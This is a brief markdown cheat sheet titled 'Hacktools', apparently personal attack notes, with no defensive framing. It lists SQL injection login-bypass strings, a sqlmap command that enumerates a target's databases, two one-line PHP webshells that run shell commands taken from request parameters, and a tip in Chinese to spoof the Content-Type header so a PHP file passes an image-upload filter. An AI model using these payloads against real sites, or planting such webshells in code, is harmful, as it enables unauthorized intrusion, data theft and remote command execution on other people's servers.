# Hacktools

# SQLI
## Easy command
'OR 1=1-- <br>
'OR '1'='1'--'

## Autotools
sqlmap -u "target-url" -p your-parament --thread 10 --random-agent --batch --dbs


# XSS


# php file upload webshell

```
<?php system($_REQUEST["cmd"]);?> 
<?php echo shell_exec($_GET['cmd']);?> 
```
or <br>
將 Content-Type: application/x-php 換成 /image/jpeg


https://github.com/Kazusa613732/Hitmap-ver.1/blob/main/README.md
